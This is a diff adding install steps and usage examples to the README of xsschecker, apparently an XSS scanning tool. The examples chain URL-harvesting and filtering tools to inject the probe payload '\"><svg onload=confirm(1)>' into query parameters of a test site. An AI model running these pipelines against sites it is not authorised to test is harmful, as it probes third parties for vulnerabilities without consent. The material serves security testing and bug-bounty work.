@@ -6,7 +6,33 @@
 ```bash
 go install github.com/rix4uni/xsschecker@latest
 ```
+or
 
 ```bash
-git clone
+git clone https://github.com/rix4uni/xsschecker.git && cd xsschecker && go build xsschecker.go && mv xsschecker /usr/bin/
+```
+## Chaining with other tools
+```bash
+echo "http://testphp.vulnweb.com" | waybackurls | anew | gf xss | qsreplace '"><svg onload=confirm(1)>' | airixss -p "confirm(1)" -H "Header1: Value1;Header2: value2"
+
+echo "http://testphp.vulnweb.com" | waybackurls | nilo | anew | gf xss | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -p "confirm(1)" -H "Header1: Value1;Header2: value2" --proxy "http://yourproxy"
+
+echo "http://testphp.vulnweb.com" | waybackurls | nilo | anew | gf xss | qsreplace -a | bhedak '"><svg onload=confirm(1)>' | airixss -p "confirm(1)" -H "Header1: Value1;Header2: value2" -x "http://yourproxy"
+
+echo "http://testphp.vulnweb.com" | waybackurls | anew | gf xss | uro | nilo | qsreplace '"><svg onload=confirm(1)>' | airixss -hm -s -c 5
+```
+
+urldedupe bhedak
+```bash
+waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | xsschecker
+```
+
+Airixss XSS
+```bash
+waybackurls testphp.vulnweb.com | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | xsschecker
+```
+
+Kxss
+```bash
+waybackurls testphp.vulnweb.com | kxss | grep "=" | sed 's/URL: //' | sed 's/=.*/=/' | uro | qsreplace '"><svg onload=confirm(1)>' | xsschecker
 ```
